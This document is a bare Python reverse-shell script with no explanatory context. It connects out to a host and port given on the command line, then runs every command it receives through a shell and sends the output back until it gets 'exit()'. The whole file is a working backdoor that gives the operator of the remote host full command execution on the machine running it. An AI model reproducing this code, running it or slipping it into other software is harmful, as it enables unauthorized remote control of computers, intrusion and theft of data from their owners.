import socket
import subprocess as sp
import sys

host = sys.argv[1]
port = int(sys.argv[2])

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect((host, port))

while True:
    command = conn.recv(1024).decode()
    if command != "exit()":
        try:
            sh = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)
            out, err = sh.communicate()
            result = out + err
            length = str(len(result)).zfill(16)
            conn.sendall(length.encode() + result)
        except Exception as e:
            conn.sendall(str(e).encode())
    else:
        break

conn.close()
